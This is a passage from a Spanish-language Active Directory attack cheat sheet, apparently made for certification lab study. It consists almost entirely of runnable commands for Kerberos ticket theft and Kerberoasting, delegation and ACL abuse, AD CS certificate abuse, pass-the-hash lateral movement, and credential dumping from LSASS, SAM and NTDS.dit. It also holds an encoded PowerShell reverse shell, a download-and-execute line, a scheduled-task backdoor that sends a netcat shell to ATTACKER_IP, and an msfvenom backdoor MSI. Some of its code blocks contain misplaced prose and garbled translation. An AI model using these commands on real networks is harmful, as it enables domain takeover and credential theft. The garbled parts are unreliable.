Confirmando que jen no tiene acceso a la carpeta restringida, ahora podemos inicie mimikatz, habilite los privilegios de depuración y exporte todos los TGT/TGS de la memoria con el comando sekurlsa::tickets /export.
```

#### Command execution
```bash
Como se han generado muchos billetes, podemos elegir cualquier billete de TGS en el formato dave@cifs-web04.kirbi e inyectarlo a través de mimikatz a través del comando kerberos::p tt.
```

#### Exporta todos los tickets Kerberos (TGT y TGS) de la memoria del sistema. Los tickets se guardan como archivos .kirbi para reutilizarlos en ataques Pass-the-Ticket.
```bash
mimikatz.exe "privilege::debug" "sekurlsa::tickets /export" "exit"
```

#### Busca objetivos que solo soporten RC4 para evitar downgrade evidente.
```bash
Rubeus.exe kerberoast /stats /rc4opsec
```

#### Cracking offline con John.
```bash
john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

#### Alternativa PowerShell/Empire compatible con John o Hashcat.
```bash
. .\Invoke-Kerberoast.ps1; Invoke-Kerberoast -Identity svcadmin
```

#### Crackear hashes con John - Use John the Ripper to brute-force the hashes. Crackea el hash Kerberoast con John y la wordlist indicada.
```bash
C:\AD\Tools\john-1.9.0-jumbo-1-win64\run\john.exe --wordlist=C:\AD\Tools\kerberoast\10k-worst-pass.txt C:\AD\Tools\hashes.txt
```

#### Forge referral ticket - Copy the base64 encoded ticket from above and use it. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:<BASE64_TICKET>
```

#### Forge referral ticket - Copy the base64 encoded ticket from above and use it. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Rubeus.exe asktgs /service:cifs/eurocorp-dc.eurocorp.LOCAL /dc:eurocorp-dc.eurocorp.LOCAL /ptt /ticket:<BASE64_TICKET>
```

---

## 05 — Kerberos Delegation Abuse (Unconstrained, Constrained & RBCD)

#### Construye descriptor de seguridad para RBCD
```bash
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```

#### Mira el Language Mode. Constrained Language Mode limita capacidades y suele integrarse con AppLocker o WDAC.
```bash
$ExecutionContext.SessionState.LanguageMode
```

#### Descubre equipos con unconstrained delegation usando PowerView.
```bash
Get-DomainComputer -UnConstrained
```

#### Descubre equipos con unconstrained delegation usando AD module.
```bash
Get-ADComputer -Filter {TrustedForDelegation -eq $True}
```

#### Encontrar Unconstrained Delegation. Enumeracion PowerView de equipos o atributos de equipos.
```bash
Get-DomainComputer -Unconstrained | select -ExpandProperty name
```

#### Ejecutar Rubeus en `dcorp-appsrv` - Copy Loader.exe to dcorp-appsrv
```bash
winrs -r:dcorp-appsrv cmd
```

#### Printer Bug para coercion - On the student VM, use MS-RPRN to force authentication from dcorp-dc$. Fuerza autenticacion mediante Printer Bug en el lab.
```bash
C:\AD\Tools\MS-RPRN.exe \\dcorp-dc.dollarcorp.moneycorp.local \\dcorp-appsrv.dollarcorp.moneycorp.local
```

#### Usar ticket capturado para DCSync - Nota: copiar el ticket base64 capturado en Rubeus y usarlo desde una shell elevada como argumento de `/ticket:`. Comando Kerberos con Rubeus dentro del flujo CRTP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args ptt /ticket:<BASE64_TICKET>
```

#### Alternativa: MS-WSP para coercion - Setup Rubeus in monitor mode exactly as with Printer Bug. Alternativa de coercion MS-WSP.
```bash
C:\AD\Tools\Loader.exe -path C:\AD\Tools\WSPCoerce.exe -args mcorp-dc.moneycorp.local dcorp-appsrv.dollarcorp.moneycorp.local
```

#### Alternativas de coercion para Enterprise Admins - MS-DFSNM. Alternativa de coercion MS-DFSNM.
```bash
C:\AD\Tools\DFSCoerce-andrea.exe -t mcorp-dc.moneycorp.local -l dcorp-appsrv.dollarcorp.moneycorp.local
```

#### Abusar Constrained Delegation con `websvc`
```bash
dir \\dcorp-mssql.dollarcorp.moneycorp.local\c$
```

#### Enumerar equipos con Constrained Delegation. Enumeracion PowerView de equipos o atributos de equipos.
```bash
Get-DomainComputer -TrustedToAuth
```

#### Enumerar permisos de escritura. Busca ACLs interesantes que puedan convertirse en escalada.
```bash
Find-InterestingDomainAcl | ?{$_.identityreferencename -match 'ciadmin'}
```

#### Configurar RBCD en `dcorp-mgmt` - We already have a reverse shell on dcorp-ci as ciadmin
```bash
Set-DomainRBCD -Identity dcorp-mgmt -DelegateFrom 'dcorp-studentx$' -Verbose
```

#### Configurar RBCD en `dcorp-mgmt` - We already have a reverse shell on dcorp-ci as ciadmin
```bash
Get-DomainRBCD
```

#### Abusar RBCD con Rubeus - Check if we can access dcorp-mgmt
```bash
winrs -r:dcorp-mgmt cmd
```

---

## 06 — Active Directory DACL / ACL Abuse (GenericAll, WriteDacl, Shadow Credentials)

#### Realizar un ataque Shadow Credentials para recuperar hashes de contraseña NTLM
```bash
Shadow Credentials
```

#### Cambiar el propietario de un objeto
```bash
WriteOwner
```

#### Agregar una entrada de control de acceso a una lista de control de acceso
```bash
WriteDACL
```

#### Escribir en cualquier atributo no protegido de un objeto
```bash
GenericWrite
```

#### Control total sobre un objeto de destino
```bash
GenericAll
```

#### Obtener ACL de un objeto
```bash
Get-Acl
```

#### Descarga y carga en memoria el script Invoke-Whisker desde un servidor controlado para preparar el ataque Shadow Credentials
```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.11/Invoke-Whisker.ps1')
```

#### Reemplazo de sethc.exe: Revisa o cambia permisos ACL de archivos o carpetas.
```bash
icacls C:\Windows\System32\sethc.exe /grant Administrator:F
```

#### Reemplazo de Utilman: Revisa o cambia permisos ACL de archivos o carpetas.
```bash
icacls C:\Windows\System32\utilman.exe /grant Administrator:F
```

#### Permisos: Revisa o cambia permisos ACL de archivos o carpetas.
```bash
icacls cmdasp.aspx /grant Everyone:F
```

#### Sustituir archivos del sistema (ACL): Toma posesión de un archivo o recurso protegido.
```bash
takeown /f <file>
```

#### Sustituir archivos del sistema (ACL): Revisa o cambia permisos ACL de archivos o carpetas.
```bash
icacls <file> /grant Administrator:F
```

#### ACL de ruta de fichero/share, no objeto AD. Sirve para comparar ACL de AD con permisos sobre recursos como SYSVOL.
```bash
Get-PathAcl -Path '\\dcorp-dc.dollarcorp.moneycorp.local\sysvol'
```

#### Tareas - Check for modify rights/permissions for student701. Busca ACLs interesantes que puedan convertirse en escalada.
```bash
Find-InterestingDomainAcl -ResolveGUIDs | ?{$_.IdentityReferenceName -match "student701"}
```

#### Una GPO con ACL demasiado permisiva puede abusarse para varias rutas. Primero confirma si tienes GenericAll, GenericWrite, WriteDacl o WriteOwner sobre la GPO.
```bash
Get-DomainObjectAcl -Identity 'Target GPO' -ResolveGUIDs
```

#### Compara permisos de filesystem/SYSVOL con permisos del objeto GPO. GPO = contenedor AD + plantilla en SYSVOL.
```bash
Get-PathAcl -Path '\\dcorp-dc\SYSVOL\dollarcorp.moneycorp.local\Policies\{GPO-GUID}'
```

#### En RedDrill, usa el mindmap ACL para decidir que puedes hacer con GPO: modificar politica, concederte derechos o cambiar owner.
```bash
Open CRTP ACL Mindmap -> GPO -> WriteDacl/GenericAll
```

#### GPODitty template - Create a share and allow Everyone full permission on the stdx-gp share
```bash
icacls "C:\AD\Tools\std701-gp" /grant Everyone:F /T
```

#### Comprueba derechos necesarios: Replicating Directory Changes y Replicating Directory Changes All.
```bash
Get-DomainObjectAcl -Identity 'DC=dollarcorp,DC=moneycorp,DC=local' -ResolveGUIDs | Where-Object {$_.ObjectAceType -match 'Replication|DS-Replication'}
```

#### Conecta DCSync con ACL: WriteDacl sobre Domain Object puede convertirse en derechos de replicacion.
```bash
Open CRTP ACL Mindmap -> Domain Object -> WriteDacl/DCSync
```

#### Lectura base: mira las ACE del objeto y traduce GUIDs. Antes de abusar nada, identifica quien tiene el permiso, sobre que objeto cae y si el derecho es GenericAll, GenericWrite, WriteDacl, AllExtendedRights o WriteOwner.
```bash
Get-DomainObjectAcl -Identity victim -ResolveGUIDs
```

#### WriteOwner no suele ser el final: primero te haces dueno, luego modificas DACL y despues te concedes el permiso util.
```bash
Set-DomainObjectOwner -Identity 'Target Object' -OwnerIdentity attacker
```

#### Segundo paso tras WriteOwner o WriteDacl: conviertes ownership/DACL en GenericAll para abusar el objeto con tecnicas concretas.
```bash
Add-DomainObjectAcl -TargetIdentity 'Target Object' -PrincipalIdentity attacker -Rights All
```

#### Si tienes ReadLAPSPassword o extended rights aplicables sobre computer object, puedes leer la password LAPS local admin si el entorno usa LAPS.
```bash
Get-ADComputer TARGET -Properties ms-Mcs-AdmPwd
```

#### Otros derechos interesantes: ResetPassword, WriteMembers, GenericAll. Menos que FullControl puede ser suficiente.
```bash
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights ResetPassword -Verbose
```

#### Conecta persistencia con el grafo ACL: AdminSDHolder no es una tecnica aislada, es abuso de ACL sobre objeto especial.
```bash
Open CRTP ACL Mindmap -> AdminSDHolder -> WriteDacl/GenericAll/WriteOwner
```

#### PowerView: confirma si student1 aparece en la ACL de Domain Admins.
```bash
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs | ForEach-Object {$_.IdentityName = $(Convert-SidToName $_.SecurityIdentifier);$_} | ?{$_.IdentityName -match "student1"}
```

#### Concede solo los derechos necesarios para DCSync.
```bash
Add-DomainObjectAcl -TargetIdentity 'DC=dollarcorp,DC=moneycorp,DC=local' -PrincipalIdentity student1 -Rights DCSync -PrincipalDomain dollarcorp.moneycorp.local -TargetDomain dollarcorp.moneycorp.local -Verbose
```

#### Ejecuta DCSync para extraer hash/clave de krbtgt despues de conceder el derecho.
```bash
execute-assembly -p explorer.exe -t 180 /mnt/c/AD/Tools/Sliver/mimikatz-dcsync.exe.packed.dotnet.exe
```

---

## 07 — Active Directory Certificate Services (AD CS - ESC1 to ESC8)

#### Command execution
```bash
certipy-ad auth -pfx administrator.pfx -dc-ip DC_IP
```

#### Command execution
```bash
ntlmrelayx.py -t http://CA_IP/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
```

#### Command execution
```bash
certipy-ad auth -pfx dc01.pfx -dc-ip DC_IP
```

#### Autentica usando el certificado obtenido. Devuelve TGT y hash NTLM del administrador.
```bash
certipy auth -pfx administrator.pfx -dc-ip DC_IP
```

#### AD CS relay conceptual. Revisa opciones y prerequisitos antes de cualquier prueba autorizada.
```bash
certipy relay --help
```

#### Vulnerable templates. Enumera o solicita certificados AD CS en el flujo del lab.
```bash
C:\AD\Tools\Certify.exe find /vulnerable
```

#### Vulnerable templates - The SmartCardEnrollment-Agent template grants enrollment rights. Enumera o solicita certificados AD CS en el flujo del lab.
```bash
C:\AD\Tools\Certify.exe find
```

#### Solicitar Enrollment Agent certificate. Enumera o solicita certificados AD CS en el flujo del lab.
```bash
C:\AD\Tools\Certify.exe request /ca:mcorp-dc.moneycorp.local\moneycorp-MCORP-DC-CA /template:SmartCardEnrollment-Agent
```

#### Enumera plantillas de certificado en ADCS desde LDAP para revisar superficie PKI.
```bash
$searcher.Filter = "(objectClass=pKICertificateTemplate)"
$searcher.SearchRoot = [ADSI]"LDAP://CN=Certificate Templates,..."
$searcher.FindAll() | Out-File cert_templates.txt
```

#### Extrae ACLs de una plantilla de certificado concreta para revisar permisos tipo Enroll o AutoEnroll.
```bash
$searcher2.Filter = "(&(objectClass=pKICertificateTemplate)(cn=User))"
$searcher2.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl
$sd.Access | Out-File acl_template_user.txt
```

#### Descompone la estructura ASN.1 de un mensaje PKCS7 o CMS en formato DER.
```bash
openssl asn1parse -inform DER -in mensaje.p7m
```

#### Muestra metadatos CMS del fichero p7m y ayuda a identificar destinatarios, emisores y algoritmos.
```bash
openssl cms -cmsout -print -inform DER -in mensaje.p7m -noout
```

#### Inspecciona el truststore Java por defecto para revisar certificados, CA emisoras y debilidades.
```bash
keytool -list -keystore cacerts -storepass changeit -v
```

#### Prueba el password por defecto de una keystore Java.
```bash
keytool -list -keystore keystore_siom.jks -storepass changeit
```

#### Prueba una credencial encontrada contra una keystore concreta.
```bash
keytool -list -keystore keystore_siom.jks -storepass [GIE_PWD]
```

#### Intenta crackear un hash SHA-512 crypt de Linux de forma offline.
```bash
hashcat -m 1800 hash.txt /usr/share/wordlists/rockyou.txt
```

---

## 08 — Lateral Movement & Remote Authentication (WinRM, SMB, WMI, PsExec)

#### 🏢 FUNDAMENTOS ACTIVE DIRECTORY
```bash
wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct
```

#### 🔷 Conexión RDP utilizando Hash NTLM (Pass-The-Hash RDP)
```bash
xfreerdp /v:10.46.142.8 /u:Administrator /pth:e591b92ad4e4774e1db7782ffbc1954c /cert:ignore
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -x 'systeminfo' --exec-method smbexec
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -x 'whoami' --exec-method wmiexec
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
impacket-psexec -hashes :8846f7eaee8fb117ad06bdd830b7586c domain.com/administrator@192.168.1.2
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
psexec.py Administrator@10.129.14.128 -hashes :NTLMHASH
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
wmiexec.py Administrator@10.129.14.128 -hashes :NTLMHASH
```

#### Obtiene la contraseña del administrador de la máquina DC01 utilizando el comando Get-ADComputer de PowerShell
```bash
Get-ADComputer DC01 -property 'ms-mcs-admpwd'
```

#### Ejecuta un comando de ejecución remota (wmiexec) utilizando el ticket de autenticación Kerberos almacenado en el archivo ccache, sin requerir contraseña
```bash
KRB5CCNAME=administrator.ccache wmiexec.py -k -no-pass administrator@dc.intelligence.htb
```

#### Crear un shell inverso en PowerShell a través de WMI
```bash
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5AD...
```

#### Crear un objeto CimSessionOption con el protocolo DCOM
```bash
New-CimSessionOption -Protocol DCOM;
```

#### Crear una sesión WMI con la máquina remota y el objeto PSCredential
```bash
New-Cimsession -ComputerName 192.168.50.73 -Credential $credential -SessionOption $Options;
```

#### Realizar consultas y enumeraciones en un host de Windows utilizando WMI
```bash
WMI
```

#### Ejecuta un comando en un servidor Windows remoto
```bash
psexec.py LOGISTICS.INLANEFREIGHT.LOCAL/red@academy-ea-dc01.inlanefreight.local -k -no-pass -target-ip 172.16.5.5
```

#### 🔐
```bash
kerberos::ptt /ticket:ticket.kirbi
```

#### 🔁 Pass-the-Hash (PtH)
```bash
evil-winrm -i 10.129.201.57 -u Administrator -H 64f12cddaa88057e06a81b54e73b949b
```

#### Conexión Pass-The-Hash con el hash obtenido para obtener acceso completo
```bash
evil-winrm -i IP -u Administrator -H HASH
```

#### Ejecuta comandos remotos vía Pass-The-Hash usando el hash robado
```bash
psexec.py domain/Administrator@IP -hashes :HASH
```

#### Command execution
```bash
Para ello, primero especificaremos DCOM como protocolo para WMI sesión con el cmdlet New-CimSessionOption en la primera línea. En la segunda línea, crearemos la nueva sesión, New-Cimsession contra nuestra IP de destino, usando -ComputerName y proporcionaremos el archivo PSCredential (-Credential $credential) junto con el objeto opciones de sesión (-SessionOption $Options). Por último, definiremos 'calc' como la carga útil que ejecutará WMI.
```

#### Command execution
```bash
PowerShell también tiene capacidades integradas de WinRM denominadas PowerShell A distancia, que se puede invocar a través del cmdlet New-PSSession proporcionando la IP del host de destino junto con las credenciales de una credencial formato de objeto similar a lo que hicimos anteriormente.
```

#### Command execution
```bash
PsExec es una herramienta muy versátil que forma parte de la suite SysInternals desarrollado por Mark Russinovich. Está destinado a reemplazar el tipo telnet aplicaciones y proporcionar ejecución remota de procesos en otros sistemas a través de una consola interactiva.
```

#### Command execution
```bash
PsExec de Metasploit
```

#### Command execution
```bash
Esta técnica de movimiento lateral también requiere que el recurso compartido de administrador denominado ADMIN$ esté disponible. Para establecer una conexión Para este recurso compartido, el atacante debe presentar credenciales válidas con permisos administrativos. En otras palabras, este tipo de Por lo general, el movimiento requiere derechos administrativos locales.
```

#### Command execution
```bash
PsExec puede ejecutar un comando de forma remota, pero no acepta hashes de contraseña. Dado que hemos generado vales de Kerberos y operamos en el contexto de jen en la sesión de PowerShell, podemos reutilizar el TGT para obtener Ejecución de código en el host files04.
```

#### Command execution
```bash
Intentémoslo ahora, ejecutando .\PsExec.exe para iniciar cmd de forma remota en la máquina files04 como jen.
```

#### Command execution
```bash
Una vez que el objeto de aplicación se guarda en la variable $dcom, podemos pasar el argumento requerido a la aplicación a través del método ExecuteShellCommand. El método acepta cuatro parámetros: Command, Directory, Parameters y WindowState. Solo somos interesado en el primer y tercer parámetro, que se rellenarán con cmd y /c calc, respectivamente.
```

#### Command execution
```bash
Con el billete dorado inyectado en la memoria, usemos PsExec_ a inicie un nuevo símbolo del sistema con misc::cmd.
```

#### Command execution
```bash
Rubeus.exe ptt /ticket:BASE64_TICKET
```

#### Windows Lateral Movement And Persistence CheatSheet / Ejecución de scripts en Windows
```bash
wscript /e:VBScript archivo.txt
```

#### Windows Lateral Movement And Persistence CheatSheet / Buscar strings: Busca coincidencias en archivos o en la salida del comando.
```bash
findstr /si "<ProcessCreate onmatch="exclude">" C:\tools\*
```

#### Windows Lateral Movement And Persistence CheatSheet / Red y Puertos: Muestra conexiones, puertos abiertos y listeners.
```bash
netstat -noa | findstr "LISTENING"
```

#### Windows Lateral Movement And Persistence CheatSheet / Red y Puertos: Consulta resolución DNS y registros del objetivo.
```bash
nslookup.exe
```

#### Windows Lateral Movement And Persistence CheatSheet / Crear tarea: Enumera, inspecciona o ejecuta tareas programadas.
```bash
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor ^
```

#### Windows Lateral Movement And Persistence CheatSheet / Crear tarea
```bash
/tr "c:\\tools\\nc64.exe -e cmd.exe ATTACKER_IP 4449" /ru SYSTEM
```

#### Windows Lateral Movement And Persistence CheatSheet / Consultar tarea: Enumera, inspecciona o ejecuta tareas programadas.
```bash
schtasks /query /tn THM-TaskBackdoor
```

#### Windows Lateral Movement And Persistence CheatSheet / Eliminar tarea: Enumera, inspecciona o ejecuta tareas programadas.
```bash
schtasks /delete /tn THM-TaskBackdoor /f
```

#### Windows Lateral Movement And Persistence CheatSheet / Eliminar SD desde el registro: Ejecuta un script o binario auxiliar.
```bash
c:\tools\pstools\PsExec64.exe -s -i regedit
```

#### Windows Lateral Movement And Persistence CheatSheet / Navegar a
```bash
HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree
```

#### Windows Lateral Movement And Persistence CheatSheet / Generar payload MSI: Genera un payload para explotación o callback.
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4445 -f msi > backdoor.msi
```

#### ⚡ SCRIPT AUTOMATIZADO MIMIKATZ / Script completo PtH
```bash
echo "Otorgando privilegios de debug..."
```

#### ⚡ SCRIPT AUTOMATIZADO MIMIKATZ / Script completo PtH
```bash
echo "Elevando el token..."
```

#### ⚡ SCRIPT AUTOMATIZADO MIMIKATZ / Script completo PtH
```bash
echo "Volcando el SAM y las credenciales..."
```

#### ⚡ SCRIPT AUTOMATIZADO MIMIKATZ / Script completo PtH
```bash
echo "Revirtiendo el token..."
```

#### ⚡ SCRIPT AUTOMATIZADO MIMIKATZ / Script completo PtH
```bash
echo "Ejecutando Pass-the-Hash..."
```

#### ⚡ SCRIPT AUTOMATIZADO MIMIKATZ / Script completo PtH
```bash
echo "Operación completada."
```

#### Pass-the-Hash con Impacket: ejecuta un shell remoto usando el hash NTLM sin conocer la password. Crea un servicio en el objetivo para ejecutar cmd.exe.
```bash
impacket-psexec -hashes :<NTLM_HASH> domain.local/administrator@<IP>
```

#### Pass-the-Hash via WMI. Mas sigiloso que psexec ya que no crea un servicio. Ejecuta comandos via Windows Management Instrumentation.
```bash
impacket-wmiexec -hashes :<NTLM_HASH> domain.local/administrator@<IP>
```

#### Pass-the-Hash via WinRM (puerto 5985). Evil-WinRM proporciona un shell interactivo de PowerShell con funciones de upload/download integradas.
```bash
evil-winrm -i <IP> -u administrator -H '<NTLM_HASH>'
```

#### Extrae hashes SAM de multiples maquinas usando Pass-the-Hash masivo. Acepta rangos CIDR para atacar toda una subred simultaneamente.
```bash
crackmapexec smb <RANGO_IP> -u administrator -H '<NTLM_HASH>' --sam
```

#### Ejecuta comandos remotamente via SMB con CrackMapExec. -x ejecuta con cmd.exe, -X ejecuta con PowerShell. Ideal para reconocimiento rapido post-explotacion.
```bash
crackmapexec smb <IP> -u administrator -p '<password>' -x 'whoami /all'
```

#### Shell semi-interactivo via SMB. Mas sigiloso que psexec ya que no deja binarios en disco. Ejecuta comandos a traves de un servicio temporal.
```bash
impacket-smbexec domain.local/administrator@<IP> -hashes :<NTLM_HASH>
```

#### EncodedCommand ejecuta contenido codificado en UTF-16LE. En defensa, esto suele ser senal de alerta; en lab ayuda a entender telemetria y detecciones.
```bash
powershell -EncodedCommand <base64_utf16le_command>
```

#### Preferencia por variable de entorno para la sesion/proceso. Usalo como concepto de laboratorio, no como sustituto de entender controles reales.
```bash
$env:PSExecutionPolicyPreference='bypass'
```

#### ADModule: propiedades completas. Puede ser pesado; usalo cuando necesitas atributos concretos.
```bash
Get-ADComputer -Filter * -Properties *
```

#### ADModule: filtra servidores por OS y devuelve nombre + sistema operativo.
```bash
Get-ADComputer -Filter 'OperatingSystem -like "*Server 2022*"' -Properties OperatingSystem | Select-Object Name,OperatingSystem
```

#### Usando Active Directory module (ADModule) - Enumerate Computers
```bash
Get-ADComputer -Filter *
```

#### Inventario basico de objetivos potenciales. Relay depende mucho de servicios, signing, EPA y configuracion.
```bash
Get-ADComputer -Filter * -Properties dNSHostName | Select-Object Name,dNSHostName
```

#### PSRemoting usa WinRM: 5985 HTTP y 5986 HTTPS. Valida puertos antes de culpar credenciales.
```bash
Test-NetConnection server1 -Port 5985; Test-NetConnection server1 -Port 5986
```

#### One-to-one stateful remoting. Crea sesion persistente en wsmprovhost.
```bash
New-PSSession -ComputerName server1
```

#### Sesion interactiva one-to-one. Si tienes privilegios adecuados, obtienes shell elevada por remoting.
```bash
Enter-PSSession -ComputerName server1
```

#### Ejecuta un script desde archivo en maquinas remotas. Requiere que el script sea apropiado/autorizado para el lab.
```bash
Invoke-Command -FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content C:\AD\Tools\servers.txt)
```

#### Ejecuta una funcion cargada localmente en equipos remotos. Util cuando ya importaste funciones en tu sesion.
```bash
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content C:\AD\Tools\servers.txt)
```

#### Stateful remoting: la variable vive en la sesion remota entre comandos.
```bash
$Sess = New-PSSession -ComputerName server1; Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}; Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
```

#### winrs usa WinRM sin el mismo modelo de PSRemoting. En el lab se menciona como alternativa; sigue generando proceso/red/logs.
```bash
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
```

#### Injecta el ticket en el proceso actual para usarlo inmediatamente.
```bash
/ptt
```

#### Forging Golden Ticket usando Rubeus - Add "-path C:\AD\Tools\Rubeus.exe -args" after Loader.exe and "/ptt" at the end of the generated command
```bash
set computername
```

#### Ejemplo de acceso via WinRM despues del PTH. Mantener placeholders obliga a entender objetivo e identidad.
```bash
Set-Item WSMan:\localhost\Client\TrustedHosts <dc_ip>; Enter-PSSession -ComputerName <dc_ip> -Authentication NegotiateWithImplicitCredential
```

#### Carga RACE.
```bash
. C:\AD\Tools\RACE-master\RACE.ps1
```

#### Permitir WMI remoto para `student702` - Run as Domain Administrator to allow studentx access to WMI
```bash
. C:\AD\Tools\RACE.ps1
```

#### Escaneo rapido de hosts vivos desde Windows en un rango concreto. Util para mapear la maqueta, pero puede ser ruidoso.
```bash
Advanced IP Scanner - Rango [SEGMENTO_MAQUETA]
```

#### Comprueba alcance basico a un host de otra subred.
```bash
ping [HOST_MOL16101]
```

#### Muestra el camino de red hasta el host objetivo y ayuda a identificar saltos y segmentacion.
```bash
tracert [HOST_MOL16101]
```

#### Prueba acceso RDP a un equipo OT concreto para validar si la GPO permite logon remoto.
```bash
mstsc /v:[PLC_HOST]
```

#### Segunda validacion RDP a otro host OT para comprobar si el bloqueo es global o solo por sistema.
```bash
mstsc /v:[SCC_HOST]
```

#### Valida si el endpoint tiene salida HTTPS hacia Internet.
```bash
Test-NetConnection google.com -Port 443
```

#### Escaneo dirigido de puertos de acceso sobre una lista de equipos del dominio usando solo PowerShell nativo.
```bash
$puertos = @(21,22,23,445,1433,3389,5985,5986)
foreach ($equipo in $equipos) {
    foreach ($puerto in $puertos) {
        Test-NetConnection -ComputerName $equipo -Port $puerto
    }
}
```

#### Prueba si la cuenta validada puede abrir sesion RDP en el servidor GIE.
```bash
mstsc /v:[GIE_SERVER]
```

#### Lista shares publicados por el servidor remoto, incluidos administrativos si son visibles.
```bash
net view \[GIE_SERVER] /all
```

#### Prueba controlada de ejecucion de un binario externo para validar si el EDR bloquea el agente.
```bash
[NOMBRE_AGENTE_C2].exe
```

#### Confirma si una cuenta existe en Azure AD usando el endpoint GetCredentialType de Microsoft.
```bash
Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/common/GetCredentialType" -Body {"username":"[LOG_USER]@[DOMINIO_PUBLICO]","isOtherIdpSupported":true} -ContentType "application/json"
```

---

## 09 — Credential Dumping (LSASS, NTDS.dit, SAM, DPAPI & LAPS)

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password --sam
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password --ntds drsuapi
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password --ntds vss
```

#### 🎯 PENTESTING ACTIVE DIRECTORY - GUÍA COMPLETA
```bash
crackmapexec smb 192.168.1.1 -u admin -p password -M mimikatz
```

#### 🟦 SMB / PYME – Comandos Importantes
```bash
sudo tail -f /var/log/samba/log.smbd
```

#### 🔐 MIMIKATZ & KERBEROS – COMPLETE ATTACK & DEFENSE GUIDE
```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest" /v UseLogonCredential /t REG_DWORD /d 0 /f
```

#### 🔐 MIMIKATZ & KERBEROS – COMPLETE ATTACK & DEFENSE GUIDE
```bash
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa" /v RunAsPPL /t REG_DWORD /d 1 /f
```

#### 🔐 MIMIKATZ & KERBEROS – COMPLETE ATTACK & DEFENSE GUIDE
```bash
sc start TrustedInstaller
```

#### Copia el archivo ntds.dit desde la unidad 'z:' a la ubicación actual
```bash
robocopy z:/windows/NTDS/ntds.dit ntds.dit
```

#### Obtiene hashes de contraseñas del sistema utilizando impacket-secretsdump
```bash
impacket-secretsdump -system system -ntds ntds.dit LOCAL
```

#### Obtiene hashes de contraseñas del sistema utilizando impacket-secretsdump con SAM
```bash
impacket-secretsdump -system SYSTEM -sam SAM LOCAL
```

#### Extrae hashes de contraseñas del registro de SAM y SYSTEM utilizando secretsdump.py
```bash
secretsdump.py -sam SAM -system SYSTEM LOCAL
```

#### Ejecuta el script gMSADumper.py para obtener un hash de contraseña
```bash
python3 gMSADumper.py -u ted.graves -p Mr.Teddy -l intelligence.htb -d intelligence.htb
```

#### Realizar un ataque DCSync para obtener el hash NT de la cuenta KRBTGT
```bash
mimikatz # lsadump::dcsync
```

#### Habilitar inicio de sesión de Samba en PingCastle
```bash
PingCastle.exe --log-samba <option>
```

#### 🔐
```bash
sekurlsa::minidump lsass.dmp
```

#### 🔐
```bash
lsadump::sam
```

#### 🔐
```bash
lsadump::lsa /inject
```

#### 🔐
```bash
lsadump::secrets
```

#### 🔐
```bash
lsadump::trust
```

#### 🔐
```bash
lsadump::dcshadow /object:target /attribute:description /value:pwned
```

#### 🧨 DCSync — Secretsdump
```bash
proxychains secretsdump.py ttimmons@172.16.8.3 -just-dc-ntlm
```

#### 🧷 Copia del NTDS.dit vía Volume Shadow Copy (VSS)
```bash
vssadmin CREATE SHADOW /For=C:
```

#### 🧷 Copia del NTDS.dit vía Volume Shadow Copy (VSS)
```bash
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit
```

#### 🚚 Transferencia a tu máquina (SMB server)
```bash
move C:\NTDS\NTDS.dit \\10.10.15.30\CompData
```

#### 🔓 Extracción de hashes desde NTDS.dit
```bash
impacket-secretsdump -ntds NTDS.dit -system SYSTEM LOCAL
```

#### 🔓 Extracción de hashes desde NTDS.dit
```bash
Administrator:500:LM:NTLM
```

#### 🔓 Extracción de hashes desde NTDS.dit
```bash
krbtgt:502:LM:NTLM
```

